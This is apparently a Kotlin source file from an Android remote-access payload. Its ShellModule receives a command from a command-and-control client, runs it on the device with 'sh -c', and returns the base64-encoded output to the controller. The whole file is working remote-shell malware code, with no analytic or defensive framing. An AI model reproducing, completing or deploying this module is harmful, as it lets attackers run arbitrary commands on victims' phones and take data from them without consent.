package com.ihk909.payload.modules

import android.content.Context
import android.util.Base64
import com.ihk909.payload.C2Client
import org.json.JSONObject
import java.io.ByteArrayOutputStream

object ShellModule {
    fun exec(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val cmd = args.getString("cmd")
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val buf = ByteArrayOutputStream()
            val rc = p.waitFor()
            p.inputStream.copyTo(buf)
            p.errorStream.copyTo(buf)
            c2.reply(id, JSONObject()
                .put("rc", rc)
                .put("stdout_b64", Base64.encodeToString(buf.toByteArray(), Base64.NO_WRAP)))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}